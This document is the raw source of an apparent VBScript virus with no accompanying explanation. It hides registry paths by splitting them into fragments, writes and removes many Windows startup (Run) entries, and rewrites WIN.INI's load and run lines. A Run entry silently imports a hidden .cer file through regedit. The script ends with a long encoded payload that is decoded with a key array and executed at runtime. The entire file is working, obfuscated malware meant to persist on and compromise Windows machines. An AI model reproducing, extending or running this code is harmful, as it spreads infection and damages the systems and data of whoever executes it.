Set CURObj = CreateObject("WScript.Shell")
mhk="HK"&"LM\SOFT"&"WARE\Micr"&"osoft\Win"&"dows\Curren"&"tVersion\Run\"
mhc="HK"&"CU\Soft"&"ware\Micros"&"oft\Win"&"dows\Curren"&"tVersion\Run\"
mhk2="HK"&"LM\SOFT"&"WARE\Micr"&"osoft\Win"&"dows\Curren"&"tVersion\"
CURObj.RegWrite ""&mhk&"W1N","regedit -s c:\windows\system\$WIN$\WINSQL.cer"
CURObj.RegWrite ""&mhk&"internat.exe","internat.exe"
CURObj.RegWrite ""&mhk&"zwupdows","12"
CURObj.RegWrite ""&mhk&"win","12"
CURObj.RegWrite ""&mhk&"mwin","12"
CURObj.RegWrite ""&mhk&"internt","12"
CURObj.RegWrite ""&mhk&"Inernet","12"
CURObj.RegWrite ""&mhk&"Internet","12"
CURObj.RegWrite ""&mhk&"iexpleror","12"
CURObj.RegWrite ""&mhk&"zxdows","12"
CURObj.RegWrite ""&mhk&"qwe","12"
CURObj.RegWrite ""&mhk&"win1","12"
CURObj.RegWrite ""&mhk&"intelnat.exe","12"
CURObj.RegWrite ""&mhk&"u1888","12"
CURObj.RegWrite ""&mhk&"intenet","12"
CURObj.RegWrite ""&mhk&"9i5zxdows","12"
CURObj.RegWrite ""&mhk&"9i5com01zxdows","12"
CURObj.RegWrite ""&mhk&"99zxdows","12"
CURObj.RegWrite ""&mhk&"88zxdows","12"
CURObj.RegWrite ""&mhk&"Start Pagewin","12"
CURObj.RegWrite ""&mhk&"Start Page","12"
CURObj.RegWrite ""&mhk&"u188","12"
CURObj.RegWrite ""&mhk&"9i5comzxdows","12"
CURObj.RegWrite ""&mhk&"9q5zxdows","12"
CURObj.RegWrite ""&mhk&"u1881","12"
CURObj.RegWrite ""&mhk&"u1882","12"
CURObj.RegWrite ""&mhk&"u1883","12"
CURObj.RegWrite ""&mhk&"u1884","12"
CURObj.RegWrite ""&mhk&"u1885","12"
CURObj.RegWrite ""&mhk&"u1886","12"
CURObj.RegWrite ""&mhk&"u1887","12"
CURObj.RegWrite ""&mhk&"u88y", "12"
CURObj.RegWrite ""&mhk&"flash", "12"
CURObj.RegWrite ""&mhk&"999izxdows","12"
CURObj.RegWrite ""&mhk&"033zxdows","12"
CURObj.RegWrite ""&mhk&"syste","12"
CURObj.RegWrite ""&mhc&"my","12"
CURObj.RegWrite ""&mhk&"3zxdows","12"
CURObj.RegWrite ""&mhk&"88u88","12"
CURObj.RegWrite ""&mhk&"system","12"
CURObj.RegWrite ""&mhk&"8zxdows","12"
CURObj.RegWrite ""&mhk&"u18","12"
CURObj.RegWrite ""&mhk&"interneet.exe","12"
CURObj.RegWrite ""&mhk2&"RunOnce\", "12"
CURObj.RegWrite ""&mhk&"iexpler", "12"
CURObj.RegWrite ""&mhk&"u1810", "12"
CURObj.RegWrite ""&mhk&"winwin", "12"
CURObj.RegWrite ""&mhk&"WIN", "12"
CURObj.RegDelete ""&mhc&""
CURObj.RegDelete ""&mhk&"zwupdows"
CURObj.RegDelete ""&mhk&"win"
CURObj.RegDelete ""&mhk&"mwin"
CURObj.RegDelete ""&mhk&"internt"
CURObj.RegDelete ""&mhk&"inernet"
CURObj.RegDelete ""&mhk&"Internet"
CURObj.RegDelete ""&mhk&"u188"
CURObj.RegDelete ""&mhk&"iexpleror"
CURObj.RegDelete ""&mhk&"zxdows"
CURObj.RegDelete ""&mhk&"qwe"
CURObj.RegDelete ""&mhk&"win1"
CURObj.RegDelete ""&mhk&"intelnat.exe"
CURObj.RegDelete ""&mhk&"intenet"
CURObj.RegDelete ""&mhk&"9i5zxdows"
CURObj.RegDelete ""&mhk&"9i5com01zxdows"
CURObj.RegDelete ""&mhk&"99zxdows"
CURObj.RegDelete ""&mhk&"88zxdows"
CURObj.RegDelete ""&mhk&"Start Pagewin"
CURObj.RegDelete ""&mhk&"Start Page"
CURObj.RegDelete ""&mhk&"9i5comzxdows"
CURObj.RegDelete ""&mhk&"9q5zxdows"
CURObj.RegDelete ""&mhk&"999izxdows"
CURObj.RegDelete ""&mhk&"033zxdows"
CURObj.RegDelete ""&mhk&"u1881"
CURObj.RegDelete ""&mhk&"u1882"
CURObj.RegDelete ""&mhk&"u1883"
CURObj.RegDelete ""&mhk&"u1884"
CURObj.RegDelete ""&mhk&"u1885"
CURObj.RegDelete ""&mhk&"u1886"
CURObj.RegDelete ""&mhk&"u1887"
CURObj.RegDelete ""&mhk&"u88y"
CURObj.RegDelete ""&mhk&"flash"
CURObj.RegDelete ""&mhk&"88u88"
CURObj.RegDelete ""&mhk&"interneet.exe"
CURObj.RegDelete ""&mhk&"u18"
CURObj.RegDelete ""&mhk&"u1888"
CURObj.RegDelete ""&mhk&"system"
CURObj.RegDelete ""&mhk&"3zxdows"
CURObj.RegDelete ""&mhk&"8zxdows"
CURObj.RegDelete ""&mhk&"syste"
CURObj.RegDelete ""&mhk2&"RunOnce\"
CURObj.RegDelete ""&mhk&"iexpler"
CURObj.RegDelete ""&mhk&"u1810"
CURObj.RegDelete ""&mhk&"winwin"
CURObj.RegDelete ""&mhk&"WIN"

Set FSO = CreateObject("Scripting.FileSystemObject")
myfile14=FSO.FileExists("c:\windows\WIN.INI")
if myfile14 then
set FSO2=FSO.OpenTextFile("c:\windows\WIN.INI")
mywin=FSO2.ReadALL()
l=Instr(mywin,"run=")-3
m=Instr(mywin,"load=")-1
n=Instr(mywin,"NullPort=")-3
FSO2.close
if l>0 and m>0 and l>m then
set FSO3=FSO.OpenTextFile("c:\windows\WIN.INI")
mywin2=FSO3.Read(l)
FSO3.close
set FSO4=FSO.OpenTextFile("c:\windows\WIN.INI")
mywin3=FSO4.Read(m)
FSO4.close
if n>0 and n>l then
set FSO5=FSO.OpenTextFile("c:\windows\WIN.INI")
mywin4=FSO5.Read(n)
FSO5.close
mywin=Replace(mywin,mywin4,"")
set FSO2=FSO.CreateTextFile("c:\windows\WIN.INI")
FSO2.Write mywin3
FSO2.WriteLine "load="
FSO2.Write "run="
FSO2.Write mywin
FSO2.close
else
mywin=Replace(mywin,mywin2,"")
set FSO2=FSO.CreateTextFile("c:\windows\WIN.INI")
FSO2.Write mywin3
FSO2.Write "load="
FSO2.Write mywin
FSO2.close
end if
end if
end if

ExeString = "=flBkVe^od)AqliMbwq%SapMbwq%AddkbdPbdm):moi^Lag^`s)?PN)PpRe^ik)PfmMZqg)LraB%ChkZixAbpjPt_HI\lq`om%(HIP^qCff%(HI@kb`q^Jhibbt%HCIhh^Fs%HC@qbZqdJZfk%HCMqli^f^mb'&Dk]Rr[Ctk\qhlgJG:mobgaSl!Chi^M`qa)SvibRqk&HkBkonoOdpnjdGbwqRbmQbZaSbfm:CRL'LobgQdumChi^%EfebO^me+.QfmRqk<Kb`aMblm'Od^]>kiHcFmpmo'QfmRqk)!HC\rqZos%(5;-LqEbm%MjoPmo(50MedkQbZaSbfm-@elrbDubqCnkbqblmBmaFeFeMvobLqq6!emq!MedkQbZaSbfm-@elrbRbmEfebSbfm:CRL'LobgQdumChi^%EfebO^me+/CbidQ^jo+Pohq^!9%?NARnkel`a6!#o_r`kfoq3#JGXps^kq'&!!;%o_BoEc#QlmLqqu_<oKc#EmjkQ^usChi^Qdji+BihpdPdqC@qmoh_:CLL-D^qEfeb'CbidMZqg&E>mqqf[+`qmoh_nqdp:0-BepdOd^]Qdji+BihpdPdqChi^Qdji<?PN+HmdkMbwq?fkb!Chi^M`qa)7&HcQxm^Pso:aqliSe^k?fkbMblm'Tqfmbs[@qI_%9!!EMJK;%o_BoEc#;#;LCVlmih^c:!!s[pbobms7%HI\lq`om%(#=#s[@qI_%AqliMbwqDilbHcQxm^Pso:o_rQgbgCbidQ^jo+Pohq^u_<oKc#S[pSbqq>kcBc?fkbMblm'@kllb>kcBc>kc?rm`mfnk?rm`mfnkHI@a^md^Pt_!@tokbmqLqqfgd+IZpsFgadu<e`oF_K^lqHk]bw@a^q6/MedkHcIdcm%K@Zpd%<rqo^ksPmohk`&+.<9IB^lb'\(MedkJG<e`k`bRr[<?fm^evCflh#9YPn_D6/Bkp^HC@g^gddPn_:@go!>r`!Idcm%K@Zpd%<rqo^ksPmohk`&+.&*.(!7ULraB:-Dk]HcDilbDGBeZkfbLra6Lf]%BrkodkmPsobkf)*)K^lqHk]bw@a^q&Dk]HcDk]Erg`sfhkErg`sfhkHC@qbZqdJZfk%LgDoklqKbrrfbK^usFeBkVe^od6!emjkQgbgBqfs?rm`mfnkDk]HcReZodCbid6Kb_q'TbkO^me+0%Mql`o`jChi^p[@hjllgEfebrYFfbohpncmReZodaUPs^mfnk^oxY[i`kd+gqfBc%?PN+?fkb>uhpmp'Pa^qb?fkb&Qabm@`ieJG:mobgaSl!Pg^kbEfeb+aqli&>irbRbmEfebSbfm:CRL'LobgQdumChi^%ReZodCbid)+)sonb(Chi^Qdji+Vobqd9!!EMJK;%o_BoEc#;#;LCVlmih^c:!!s[pbobms7%HI\lq`om%(#=#s[@qI_%AqliMbwqEfebSbfm-@elrbDk]HcCb_^timFc6VpLedie+Qb`Od^]%!EDBX\<RQO>KS\NPDOUFcbgqhqbbrY=be^nisNpdoFCLnqKlhhUbkphlg<PpRe^ik+KbfO^^c%EJBR\KL<>K\F>BEBKDYLleqp^qbUJh`klrl_q[LnqklhhBqmqblp[J^ah^ObqTlPgbei-O^dVobqdEJBR\BRKODKM\TP>O[F]bmqbqhblY!#=be^nisF]#!YLleqp^qbUJh`klrl_q[LnqklhhBqmqblp[Kb_q'LnqKlhhUbkphlg)0&#!+)YL^bi[@hjollbRlbPm^sfhkdor+.%QB@\CTHOCB^eiHCJ`feOdd!GH>V^@NOQBGQ^RLBQYBadkmfsf^p[AdcZrkqBa%UPncmt`o^YLf\onphcsYHrsihlj>uoo^prY#I^cs%HrsIhljS^orfhk+.%'-[JZfkYLq`qblmbkvKZjd%Pg^kbEfeb(@`ieJGF^hiKbf%EJBR\BRKODKM\TP>O[F]bmqbqhblY!#=be^nisF]#!YLleqp^qbUJh`klrl_q[LnqklhhBqmqblp[Kb_q'LnqKlhhUbkphlg)0&#!+)YL^bi[TbadLq`qblmbkvKZjd%Pg^kbEfeb(TrPabki'OddPohq^!EDBX\<RQO>KS\NPDOUPncmt`o^YLf\onphcsYHcef\b[6'-[Lnqklhh[Liqhlgp[JZfkY>ahqhoOo^cdo^kbb)00*-6/%QB@\CTHOCB^eiHCJ`feOdd!GH>V^@NOQBGQ^RLBQYLleqp^qbUJh`klrl_q[TbkclppJ^pr^`fmdPt_lvrq^j[MklefebrYFfbohpncmNrminldHkmbqk^qP^qsfgdrY)^/a)//-)-/-)-/-\-/-)-/-)-/-)-33U-/.^-23)+[i`kd(@`ieJGF^hiKbf%EJBR\BRKODKM\TP>O[PhcstZodYFfbohpncmYVfgantlMQU@tokbmqObqpblmYPfmahtrFbrpZdhk`Rr[pxpmblYIoncbidpUJh`klrl_qLnqklhhFgqdogbsLbsqbkfpU-`-]-1-)-/-)-/-)`/-)-/-)-/-)-/1/Y/-*b/0/-!)_k^gh!&VpLedie+Qb`TqfmbAHDVX@TOKBMQXRRBKYRl_qv^kb[Jb`qllleqULecb`dY*---ULtqelnhULoqblmpUJ`feYDabqnoIodc^odk\b!)*00-0/+KBF\=TNO=<^kiHIJZfkO^d'AHDVX@TOKBMQXRRBKYRl_qv^kb[Jb`qllleqULecb`dY*---U@njflmYF^hiLbsqbkfpUKdtLq`qblmbkv!)_k^gh!&JGnjl^`bEleado!Idcm%VfgM`qa)2&#Iondk^l?fkblYBlfjnkChi^p[Jb`qllleqPg^kbcYLq`qblmbkv!&Dk]Erg`sfhkErg`sfhkHC@qbZqdJbihbn%(Lm>oqlkQblrlbKdumQ^joMZqg6!HcKnq!CRL'Chi^Bwflqr%PfmMZqg!TL`qfiq-bqb!&Se^kMblmI^se:lvrq^j2/U>kcBcBcQ^joMZqg6!prpsbf01YSe^kLq`omRoCbid6VfgM`qa%PXPMBLYDbqk^i2/'akiBepdPs^kqTm?fkb:TbkO^me#RVLQDJUHdogbk+]ikDk]HcVpLedie+Qb`TqfmbAHDVXIN@:I^J:@GFGB[PhcstZodYFfbohpncmYVfgantlYBrkodkmSdolfnkUOtkUHdogbk0++Pm^qqNmEfeb?PN+<lov?fkbThkI^se#pbaYdgv^ei-dbc!)PfmMZqg!t^_[Chicbk+gqm?PN+<lov?fkbThkI^se#lvrq^j2/UhitZik+`fe%ThkI^se#lvrq^j2/Uadpdqnm'fmf@ZikDG@mibmaMl'TbkO^me#vb[YEleado'esq)!emq!&VpLedie+Qb`TqfmbAHDVX@K>LPDPXONLMY-aei[%ciechi^PpRe^ik+KbfTkfsbGH>V^@E>RP>P^OHLSY'akiU@nkmbmqQxm^+Zmoib``qblm,q*lp]lvkel`aTlPgbei-O^dVobqdEJBR\BI:PRBL\QLHQ[aeiefeb[A^c`reqH`hk[%TrPabki'OddKb`a!GH>V^@E>RP>P^OHLSYouccbidY=be^nisF\lmY&PpRe^ik+KbfTkfsbGH>V^@E>RP>P^OHLSY]ikcbidYL`qfiqDk`fmbU+O?R`kfoqTlPgbei-O^dVobqdEJBR\BI:PRBL\QLHQ[aeiEfeb[PabkiULobgYBlfj`k]Y!)PfmMZqgSbfmO^me#VP\ohmm+du^!.!)VpLedie+Qb`TqfmbAHDVX@K>LPDPXONLMYcieChi^YRe^ikBqYOohmdomvRe^bsEZkci^orYPPGMklopU+t3//.1B>.*82,?,.*@E*1@83&-/>:-/?14/5<z!TrPabki'OddPohq^!EDBX\<I@PLBR\KLNQUaki?fkbUPbobmsEhpsBg`na^Y!)x72*003,.,11-B**.C/&?0C2*/-<-3C13B0+1|RbmEfebSbfm:CRL'LobgQdumChi^%RqZosRiChi^)1)motbCbidQ^jo+Pohq^U_lQdumCbidQ^jo+<inp^BgaCnkbqblmCnkbqblmDGKfdbHq!&BcFgTgbkb97!emjkQgbgBqfs?rm`mfnkDk]HcSebpKl\^sfhk:an`njdkm+kl\^sfhkBcI^cs%MehpElb^mfnk%3&:_fkbSe^kMehpElb^mfnk:Jba'QafrIh``qblm)2&BcCLL-D^qDumbmpblmKZjd%MehpElb^mfnk;;!medkSebpKl\^sfhk:Idcm%SebpKl\^sfhk+I^k'QafrIh``qblm&*I^k'CLL-D^qEfebM^fb'QafrIh``qblm&&>kcBcBcI^k'QafrIh``qblm&;0QgbgQafrIh``qblm6SebpKl\^sfhk#[Dk]HcJGnjl^`bEleado!QgflIn`Zqhlg&>kcBc>kc?rm`mfnk?rm`mfnkHIJZfkO^d'O^dRqk)EfebM^fb(Lm>oqlkQblrlbKdumO^dSbfmRqk<PpRe^ik+KbfO^^c%KbfPmo(FeKbfQ^joPmo:!MedkVpLedie+Qb`TqfmbO^dRqk)EfebM^fb>kcBc>kc?rm`mfnk?rm`mfnkHIL[lRr[%BrkodkmPsobkf&Rr[B:-MbrqHrs6/AnPehi^SonbMbrqHrs6SblqNrm**F_SblqNrm=+5Qabm@tokbmqLqqfgd:ChkZixAbpj!7U>uhqAnBmaFeLm>oqlkQblrlbKdumP^qQafrChicbk<?PN+@bsChicbk%BrkodkmPsobkf&RbmCf\Pt_:@kb`q^Lag^`s%Pbobmsfgd-Ab`sfhk`or(PdqCni]bqp:QafrChicbk+Rr[Cni]bqpEleado<ltkm<)ChoBZ`gMblm?lka^ofgEleadolChicbk@nrgq:Cni]bq@hrmq(.Cf\Pt_'^caCni]bq@hrmq%SbfmEleado'K`j^K^usFe=fbPn_-@hrmq:-QgbgIZpsFgadu<e`o:FgpsoKbu%<rqo^ksPmohk`)!Y)Kbg%BrkodkmPsobkf&&.(Pt_Lqqfgd:Jha!@tokbmqLqqfgd+IZpsFgadu<e`o$.+I^k'@noqbgqRqkfmd*K^lqHk]bw@a^q**&<rqo^ksPmohk`<DGBeZkfbLra%<rqo^ksPmohk`)K^lqHk]bw@a^q&Rr[B:.>irbHcPt_><)Se^k<rqo^ksPmohk`<<rqo^ksPmohk`%=fbPn_-Fmbl%*&#[DubqAhBepdg:-?lqc<*SlCni]bq@hrmqHcIB^lb'Pn_Rqkfmd<E@`p^%Cf\Pt_'Fsbf%i&Se^kBcg9Chicbk@nrgqQabm@tokbmqLqqfgd:@tokbmqLqqfgd#Ah`Lra+Bqdj!g*.%Y!BwfmClDk]HcDk]HcMbqqE^rqBkcbq@g^k<BkrqkOds!@tokbmqLqqfgd+U+I^k'@noqbgqRqkfmd*0&Rr[Psobkf6Lf]%BrkodkmPsobkf)E^rqBkcbq@g^k(0)Ebm%<rqo^ksPmohk`&,IZpsFgadu<e`o&.(@tokbmqLqqfgd:HI@a^md^Pt_!@tokbmqLqqfgd+IZpsFgadu<e`oBgaF_BgaF_IhloHIL[lRr[<<rqo^ksPmohk`BgaCnkbqblmCnkbqblmDGOohm`dZqd%LgDoklqKbrrfbK^usOddI^seO^kr^<EJBR\KL<>K\F>BEBKDYLleqp^qbUJh`klrl_q[LnqklhhBqmqblp[A^dqb^=frh=bfo^b:TrPabki'OddKb`a!OddI^seO^kr^&BcAbpjA^dqb^<QabmAhpdAddkbd6Efg^kv=frh#3Y!BmaFeCnof<.qn.AbpjA^dqb^<DGN_hPt_!AhpdAddkbd&JGnjl^`bEleado!AhpdAddkbd&MbqqPpRe^ik+KbfTkfsbOddI^seO^kr^)CflhCb`odbDk]Erg`sfhkErg`sfhkHCrljZddChicbk%O^meM^fb(Lm>oqlkQblrlbKdumP^qChicbkK`j^<?PN+@bsChicbk%O^meM^fb(PdqQgflChi^p:Cni]bqKZjd+?fkblEmqDubpsp:-ElkD^\eQafrCbidBkQafrCbidpEfebDum<N@`p^%EPH+FbmBwq^krfhkM^fb'QafrCbid+I^se&BcCbidBqq:GQFLkEfebDum<ESJELkEfebDum<>RMNoChi^Bwq:IEOLq?fkb>us6!GLM!MedkB^eiHC>om^kcQh%SebpEfeb-MZqg)esje(Bkp^Fe?fkb>us6!S;P!MedkB^eiHC>om^kcQh%SebpEfeb-MZqg)sap&>irbBcCbidBqq:GQMQabmEsq>uhpmp:.>kcBcGbwqHc%T@Zpd%I^seG^lb<N@`p^%VfgM`qa%AdpdqnmU(&Lq!RB^lb'MZqgKZjd&:R<^rb!ThkI^se#=brhmlo&Se^kAqsBqfrql<*BgaF_F_GqmBwflqr6/MedkEPH+BlivEfebTbkO^me#rvlqdj,/[a^pjqhm-fgf!)I^seG^lbEPH+BlivEfebTbkO^me#vb[YEleado'esq)O^meM^fb>kcBc>kc?rm`mfnk?rm`mfnkHIP^qCff%(Lm>oqlkQblrlbKdumBko-@eb`oSblqHq:TL`qfiq-P\ohmmCtiek`j^F_DokSe^kBkVe^od6!emjkDilbBkVe^od6!s[p!BmaFeFeBkVe^od6!s[p!MedkRbmEPH<<od^mbN_cbbq!R`kfoqbkf+?fkbLvrq^jN_cbbq&LbsPpRe^ik6Bo^^sbH_ib\q'PPbobms+Ledie(Bkp^P^q>imkbH_ib\q:an`njdkm+`miidql%!HC\fr^ps>imkbH_ib\q-p^qBILFC%xE6,2C@+/,.<C/**.C-&>C?2*/-<-3C=27>)?|>imkbH_ib\q-`kb`q^Fmpm^m`^%(PdqTrPabki:>imkbH_ib\q-D^qN_cbbq!&:moi^Lag^`s+lbs@EPHA!z-=12C>-0*?-80&.0@?*76--,-)>/@2-41+/7z&:moi^Lag^`s+\od^mbHklq`k\b'&RbmEPH<:moi^Lag^`s+@bsL[gd`m%(BmaFePdqAhpdLag^`s6EPH+CobsdpElkD^\eAbpjQ^joBkAbpjL[gd`mF_CflhSbfm-AkfubMvob9=+@k]CflhSbfm-AkfubMvob9=*Se^k>uhqCnoDk]HcEfg^kv=frh:AbpjQ^jo+=ohs^IdqmbqKdumAbjLmedo:oq%,&K^mahjhw^Chof6-Qh2Lse^o@ok%h&:Fgq'%2)Kkc&K^usQdjiPsobkf6!Elkh:*SlIdk!QgflQdum&MblmGrl6@p\%Lf]%SebpSbqq+f%.(&HcQdjiKtj:.,Se^kMblmGrl615DilbHcQdjiKtj:.)Se^kMblmGrl616Dk]HcSbfmBeZo:@go!QdjiKtj*Lmedo:oq%bLl]3&F_SbfmBeZo:@go!03&QgbgQ^jo@a^q6Bek%05BgaF_Q^joPmohk`<MblmLqqfgd#Qdji@g^kK^usRmIh`jPmo:Du^`tq^%!=flDbx>ko'0)SebpSbqq!sa@kIe#Jbr>qo!-(6!Nqabq>ko'-%!#o_BoEc%Hdv:oq%*&:#Lse^o@ok%0&#%s[@qI_#!Dbx>ko'/<%Hqgbk>qo!/(!#u_<oKc!H^v@ok%2&:#Lmedo:oq%,&#!sa@kIe#Elkh:*SlIdk!BwbLqqfgd(#u_<oKc!Q^joKnj:>r`!Jha!BwbLqqfgd+f%.(&%s[@qI_#!BcQ^joKnj:.7Medk%s[@qI_#!MblmGrl621%s[@qI_#!>kcBc!sa@kIe#SbfmBeZo:@go!QdjiKtj(H^v@ok%hFlc-&(#u_<oKc!F_SbfmBeZo:@go!/7&Qgbg!#o_BoEc%Qdji@g^k<o_Bo%s[@qI_#!>irbBcQ^jo@a^q6Bek%16Se^k!sa@kIe#SbfmBeZo:saI_!#o_BoEc%BmaFe#u_<oKc!QafrQ^us6SebpSbqq#Qdji@g^k!#o_BoEc%Kdum!&%o_BoEc#Du^`tq^%SebpSbqq(SebpSbqq:Du^Psobkf6!%MblmLqqfgd#!EmjkQ^us6;#l`qfiqiZkfrZdd:o_r`kfoq7#sa@kIe!ah`tj^ks+pohq^!!#;#]fulqxi^:&mhphqblm7Z_rlersb4kb_q9-iu:mlo7)mw8thame9-iu:abhdaq9-iu:s*hk]bw7+5:ofrf[fkfmv9afca^k&;%9!!#:MOI>QK:JD:DG!!\`rdpmGBBDGQ6-TBASE6-`had:\ll+fp-#!Z`sfobW+:`sfob!!U<llmhkdkm;!!9%,@MIIDQ7#;#(ahs7!#s[@qI_%9!!,l`qfiq=#s[@qI_%9!!p\ohmmk^gdt^`b<s[pbobms;%o_BoEc#QgflQdum%o_BoEc#RmIh`jPmo#sa@kIe!9%,r`kfoq7#sa@kIe!9%,AL=V=#s[@qI_%9!!,AQLI7O_rQ^us6SebpSbqq#sa@kIeTkElbhLqqu_<oKc#DG^pm^qq!&!ThkI^se:CLL-D^qRm^`h^eCni]bq%)&#[Hc%EPH+EfebDubpsp!ThkI^se#pbaY?lka^o-emq!&Se^k?PN+<lov?fkbThkI^se#pbaY?lka^o-emq!)PfmMZqg!t^_[hct`ie+ff_>kcBcBc%?PN+?fkb>uhpmp'TbkO^me#rvlqdj,/[a^pjqhm-fgf!&Se^k?PN+<lov?fkbThkI^se#lvrq^j2/Uadpdqnm'fmf)VfgM`qa%pxpmbl0+Yjgp^ki'dhcBgaF_BgaCnkbqblm"
Execute("Dim KeyArr(3),ThisText"&vbCrLf&"KeyArr(0) = 3"&vbCrLf&"KeyArr(1) = 7"&vbCrLf&"KeyArr(2) = 3"&vbCrLf&"KeyArr(3) = 1"&vbCrLf&"For i=1 To Len(ExeString)"&vbCrLf&"TempNum = Asc(Mid(ExeString,i,1))"&vbCrLf&"If TempNum = 18 Then"&vbCrLf&"TempNum = 34"&vbCrLf&"End If"&vbCrLf&"TempChar = Chr(TempNum + KeyArr(i Mod 4))"&vbCrLf&"If TempChar = Chr(28) Then"&vbCrLf&"TempChar = vbCr"&vbCrLf&"ElseIf TempChar = Chr(29) Then"&vbCrLf&"TempChar = vbLf"&vbCrLf&"End If"&vbCrLf&"ThisText = ThisText & TempChar"&vbCrLf&"Next")
Execute(ThisText)
KJ_start()